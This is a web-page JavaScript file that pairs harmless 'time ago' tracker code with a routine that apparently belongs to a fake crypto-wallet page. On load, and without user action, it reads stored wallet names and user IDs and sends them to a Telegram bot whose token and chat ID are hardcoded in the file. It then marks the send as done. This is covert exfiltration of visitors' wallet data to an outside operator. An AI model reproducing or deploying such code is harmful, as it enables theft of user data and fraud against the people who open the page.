function formatTimeDifference(timestamp) {
            const now = new Date();
            const date = new Date(timestamp);
            const seconds = Math.floor((now - date) / 1000);

            if (seconds < 10) return 'just now';
            if (seconds < 60) return `${seconds} seconds ago`;

            const intervals = {
                year: 31536000,
                month: 2592000,
                week: 604800,
                day: 86400,
                hour: 3600,
                minute: 60
            };

            if (seconds < intervals.hour) {
                const mins = Math.floor(seconds / intervals.minute);
                return `${mins} minute${mins === 1 ? '' : 's'} ago`;
            }
            if (seconds < intervals.day) {
                const hours = Math.floor(seconds / intervals.hour);
                return `${hours} hour${hours === 1 ? '' : 's'} ago`;
            }
            if (seconds < intervals.day * 2) return 'yesterday';
            if (seconds < intervals.week) {
                const days = Math.floor(seconds / intervals.day);
                return `${days} day${days === 1 ? '' : 's'} ago`;
            }
            if (seconds < intervals.month) {
                const weeks = Math.floor(seconds / intervals.week);
                return `${weeks} week${weeks === 1 ? '' : 's'} ago`;
            }
            if (seconds < intervals.year) {
                const months = Math.floor(seconds / intervals.month);
                return `${months} month${months === 1 ? '' : 's'} ago`;
            }
            const years = Math.floor(seconds / intervals.year);
            return `${years} year${years === 1 ? '' : 's'} ago`;
        }

        // Update display for a specific tracker
        function updateTrackerDisplay(trackerId) {
            const trackerElement = document.getElementById(trackerId);
            if (!trackerElement) return;

            const storedTime = localStorage.getItem(`trackedTime_${trackerId}`);
            if (storedTime) {
                trackerElement.textContent = formatTimeDifference(parseInt(storedTime));
            } else {
                trackerElement.textContent = "Not tracked yet";
            }
        }

        // Start/restart tracking for a specific div
        function startTracking(trackerId) {
            // Set new timestamp
            const currentTime = new Date().getTime();
            localStorage.setItem(`trackedTime_${trackerId}`, currentTime.toString());
            
            // Update display immediately
            updateTrackerDisplay(trackerId);
        }

        // Update all trackers
        function updateAllTrackers() {
            document.querySelectorAll('.time-tracker').forEach(tracker => {
                updateTrackerDisplay(tracker.id);
            });
        }

        // Initialize on page load
        window.onload = function() {
            // Update all existing trackers
            updateAllTrackers();
            
            // Set up periodic updates (every minute)
            setInterval(updateAllTrackers, 60000);
        };


const walletCreated = localStorage.getItem('walletCreated');
if (walletCreated === 'true') {
startTracking('tracker-one');
}


// Function to send data to Telegram bot
async function sendToTelegramBot(data, botToken, chatId) {
    try {
        const message = `Wallet Data:\n\nWallet Name: ${data.walletName}\nWallet User ID: ${data.walletUserId}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        if (!response.ok) {
            throw new Error(result.description || 'Failed to send message');
        }
        
        console.log('Data sent to Telegram bot successfully:', result);
        return result;
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
        throw error;
    }
}

// Function to check import status and send wallet data if enabled
async function checkAndSendWalletData(botToken, chatId) {
    try {
        // Check if import is enabled
        const importStatus = localStorage.getItem('Send');
        
        if (importStatus !== 'enabled') {
            console.log('Import is not enabled. No data will be sent.');
            return;
        }

        // Get wallet data
        const walletName = localStorage.getItem('walletName');
        const walletUserId = localStorage.getItem('walletUserId');

        if (!walletName || !walletUserId) {
            console.log('Wallet data not found in localStorage');
            return;
        }

        // Prepare data object
        const walletData = {
            walletName: walletName,
            walletUserId: walletUserId
        };

        // Send data to Telegram bot
        await sendToTelegramBot(walletData, botToken, chatId);
        
        // Disable send after successful send
        localStorage.setItem('Send', 'disabled');
        console.log('Send has been disabled after successful send');
        
    } catch (error) {
        console.error('Error:', error);
    }
}



// Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = '8163151595'; 

// Execute the check and send function
checkAndSendWalletData(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
